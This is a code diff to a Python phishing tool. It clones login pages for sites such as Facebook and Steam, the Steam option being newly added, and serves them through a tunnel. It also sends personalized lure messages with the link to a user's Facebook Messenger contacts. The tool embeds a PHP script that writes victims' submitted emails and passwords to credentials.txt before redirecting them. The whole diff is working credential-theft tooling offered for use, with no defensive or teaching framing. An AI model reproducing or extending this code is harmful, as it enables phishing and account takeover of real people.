@@ -31,7 +31,7 @@ class Phisher:
     #
     # TODO: Email option will be implemented soon!!!.
     #
-    def deliver(self, linkhttps, linkhttp):
+    def deliver_fb(self, linkhttps):
         fbdel = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to deliver to FB Messenger [Y/n]: ")
         while fbdel == "":
               fbdel = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to deliver to FB Messenger [Y/n]: ")
@@ -39,13 +39,13 @@ class Phisher:
 
         # Send the link to a FB User..
         if (fbdel == "Y" or fbdel == "Yes" or fbdel == "yes" or fbdel == "y"):
-            self.send_fb_message(linkhttps, linkhttp)
+            self.send_fb_message(linkhttps)
 
 
     """
     Send a facebook message.
     """
-    def send_fb_message(self,linkhttps, linkhttp):
+    def send_fb_message(self,linkhttps):
         config = ConfigParser.RawConfigParser()
         config.read("config.cfg")
 
@@ -93,40 +93,17 @@ class Phisher:
 
                         if (send == "Y" or send == "Yes" or send == "yes" or send == "y"):
 
-                            is_https = raw_input(
-                                Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to use HTTPS [Y/n]: ")
+                            # Replace {name} with the user's name.
+                            newMsg = str(message).replace("{name}", user.name)
 
-                            while is_https == "":
-                                  is_https = raw_input(
-                                    Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to use HTTPS [Y/n]: ")
+                            # Send it now.
+                            client.send(Message(text=newMsg + "\n\n" + linkhttps), thread_id=user_id, thread_type=ThreadType.USER)
 
+                            print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
+                            Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "MESSAGE " +
+                            Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "SENT. >:) ")
 
-                            if (is_https == "Y" or is_https == "Yes" or is_https == "yes" or is_https == "y"):
-
-                                # Replace {name} with the user's name.
-                                newMsg = str(message).replace("{name}", user.name)
-
-                                # Send it now.
-                                client.send(Message(text=newMsg + "\n\n" + linkhttps), thread_id=user_id, thread_type=ThreadType.USER)
-
-                                print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
-                                Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "MESSAGE " +
-                                Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "SENT. >:) ")
-
-                                time.sleep(5)
-                            else:
-                                # Replace {name} with the user's name.
-                                newMsg = str(message).replace("{name}", user.name)
-
-                                # Send it now.
-                                client.send(Message(text=newMsg + "\n\n" + linkhttp), thread_id=user_id,
-                                            thread_type=ThreadType.USER)
-
-                                print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
-                                      Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "MESSAGE " +
-                                      Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "SENT. >:) ")
-
-                                time.sleep(5)
+                            time.sleep(5)
 
 
             except FBchatException:
@@ -162,6 +139,8 @@ class Phisher:
             self.clone("reddit")
         if (option == "8"):
             self.clone("pinterest")
+        if (option == "9"):
+            self.clone("steam")
     """
     Clone the site
     """
@@ -212,6 +191,9 @@ class Phisher:
             subprocess.call(["cp", "-r", "sites/pinterest/index.html", "/var/www/html"])
             subprocess.call(["cp", "-r", "sites/pinterest/index_files", "/var/www/html"])
 
+        if (site == "steam"):
+            subprocess.call(["cp", "-r", "sites/steam/index.html", "/var/www/html"])
+            subprocess.call(["cp", "-r", "sites/steam/index_files", "/var/www/html"])
 
 
         # Starting the webserver.
@@ -241,21 +223,29 @@ class Phisher:
 """
 <?php
 header('Location: %s');
-$handle = fopen('credentials.txt', 'a');
-foreach ( $_POST as $variable => $value ) {
 
-    if ($variable == "email") {
-        fwrite($handle, $value);
-        fwrite($handle, ':');
-    }
+
+// Write the credentials from the Post Requets.
+function write_creds() {
+    $handle = fopen('credentials.txt', 'a');
+    foreach ( $_POST as $variable => $value ) {
     
-    if ($variable == "pass") {
-        fwrite($handle, $value);
-        fwrite($handle, "\\n");
-        break;
+        if ($variable == "email") {
+            fwrite($handle, $value);
+            fwrite($handle, ':');
+        }
+        
+        if ($variable == "pass") {
+            fwrite($handle, $value);
+            fwrite($handle, "\\n");
+            break;
+        }
     }
+    exit;
 }
-exit;
+
+// Call the write creds function.
+write_creds();
 ?>        
         
 """ % redir)
@@ -276,8 +266,8 @@ exit;
         time.sleep(1)
 
 
-        # Deliver the message.
-        self.deliver(j['tunnels'][0]['public_url'],j['tunnels'][1]['public_url'])
+        # Deliver the FB message.
+        self.deliver_fb(j['tunnels'][0]['public_url'])
 
         # Print out the screen that captures the Credentials
         subprocess.call(["clear"])
@@ -289,11 +279,8 @@ exit;
               """\t\tUse Your Social Engineering Skills To Get Someone To Type In
                  \t\tThere Username And Password.\n""")
 
-        print(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "\t\t\t\tHTTPS: " +
+        print(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "\t\t\t\tLINK: " +
               Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + j['tunnels'][0]['public_url'])
-
-        print(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "\t\t\t\tHTTP:  " +
-              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + j['tunnels'][1]['public_url'] + "\n")
 
         print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTBLACK_EX +
               "\t\t==============================================================\n")
@@ -421,6 +408,7 @@ class Menu:
                     6.) Tumblr  (No-Redirect)
                     7.) Reddit
                     8.) Pinterest
+                    9.) Steam
             """)
 
             try:
